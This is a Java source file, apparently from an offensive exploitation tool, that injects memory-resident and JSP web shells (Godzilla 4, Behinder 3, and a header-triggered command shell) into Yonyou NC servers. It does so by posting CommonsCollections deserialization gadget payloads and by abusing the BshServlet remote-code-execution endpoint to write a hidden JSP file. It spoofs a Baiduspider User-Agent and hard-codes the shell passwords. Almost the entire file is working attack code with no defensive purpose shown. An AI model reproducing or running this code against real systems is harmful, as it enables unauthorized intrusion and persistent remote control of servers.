package vul;

import Util.HttpUtil;
import Util.RandomStringGenerator;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;
import java.io.InputStream;
import java.net.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class memshell {

    private InputStream behinderCC6 = exec.class.getResourceAsStream("/cc6-behinder.bin");

    private InputStream godzillaCC6 = exec.class.getResourceAsStream("/cc6-godzilla.bin");
    private InputStream behinderCC7 = exec.class.getResourceAsStream("/cc7-behinder.bin");

    private InputStream godzillaCC7 = exec.class.getResourceAsStream("/cc7-godzilla.bin");
    private InputStream cmdCC6 = exec.class.getResourceAsStream("/cc6-cmd-via.bin");
    private InputStream cmdCC7 = exec.class.getResourceAsStream("/cc7-cmd-via.bin");


    public String memShellAction(Map deserializeMap, String vulName, String url, String shellType, Object proxy) throws IOException {
        String result;
        if (vulName.contains("反序列化")) {
            String path = (String) deserializeMap.get(vulName);
            result = deserializeAction(url, path, vulName, shellType, proxy);
        } else if ("BshServlet rce".equals(vulName)) {
            result = BshServletRce(url, shellType, proxy);
        } else if ("All".equals(vulName)) {
            result = "请选择对应的漏洞";
        } else {
            result = "该漏洞暂不支持";
        }
        return result;

    }

    public String BshServletRce(String url, String shellType, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        String randomStr = RandomStringGenerator.generateRandomString(10);
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String shellInfo;
        String shellBase64;
        if ("哥斯拉4".equals(shellType)) {
            shellBase64 = "";
            shellInfo = "shell类型：哥斯拉4\n地址：/*\n密码：yezhu\nkey：peiqi\n类型：JAVA_AES_BASE64\n自定义请求头：\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n\n";
        } else if ("冰蝎3".equals(shellType)) {
            shellBase64 = "";
            shellInfo = "shell类型：冰蝎3\n地址：/*\n密码：yezhupeiqi\n类型：jsp\n自定义请求头：\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n\n";
        } else {
            return "暂不支持该内存马";
        }
        String data = String.format("bsh.script=public static void writeExternalFile(){\n" +
                "  String filePath = \"webapps/nc_web/.%s.jsp\";\n" +
                "  FileWriter writer;\n" +
                "try {\n" +
                "  writer = new FileWriter(filePath,true);\n" +
                "writer.write(new String((new sun.misc.BASE64Decoder()).decodeBuffer(\"%s\")));\n" +
                "  writer.write(\"\\r\\n\");\n" +
                "  writer.flush();\n" +
                "  writer.close();\n" +
                "}catch (IOException e){\n" +
                "  \n" +
                "  }\n" +
                "}\n" +
                "\n" +
                "writeExternalFile();", randomStr, shellBase64);
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "servlet/~ic/bsh.servlet.BshServlet", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                response = HttpUtil.get(url + String.format(".%s.jsp", randomStr), headers, (HttpUtil.ProxyConfig) proxy);
                statusCode = String.valueOf(response.code());
                if ("200".equals(statusCode)) {
                    return shellInfo;
                } else {
                    return "打入失败";
                }
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {

            return "请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String deserializeAction(String url, String path, String vulName, String shellType, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        InputStream data;
        String shellInfo;
        if ("哥斯拉4".equals(shellType)) {
            if (vulName.contains("cc6")) {
                data = godzillaCC6;
            } else {
                data = godzillaCC7;
            }
            shellInfo = "shell类型：哥斯拉4\n地址：/*\n密码：yezhu\nkey：peiqi\n类型：JAVA_AES_BASE64\n自定义请求头：\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n\n";
        } else if ("冰蝎3".equals(shellType)) {
            if (vulName.contains("cc6")) {
                data = behinderCC6;
            } else {
                data = behinderCC7;
            }
            shellInfo = "shell类型：冰蝎3\n地址：/*\n密码：yezhupeiqi\n类型：jsp\n自定义请求头：\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n\n";
        } else if ("cmd马".equals(shellType)) {
            if (vulName.contains("cc6")) {
                data = cmdCC6;
            } else {
                data = cmdCC7;
            }
            shellInfo = "shell类型：cmd马\n地址：/*\n触发请求头：via\n自定义请求头：\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n\n";
        } else {
            data = null;
            shellInfo = "";
            return "该漏洞暂不支持";
        }

        RequestBody body = HttpUtil.createRequestBodyFromStream(data, okhttp3.MediaType.parse("application/octet-stream"));
        Response response = null;
        try {
            response = HttpUtil.post(url + path, headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                return String.format("内存马注入完毕，需要自行判断是否注入成功\n\n%s", shellInfo);
            } else {
                return "接口不存在";
            }
        } catch (IOException e) {

            return "请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

}
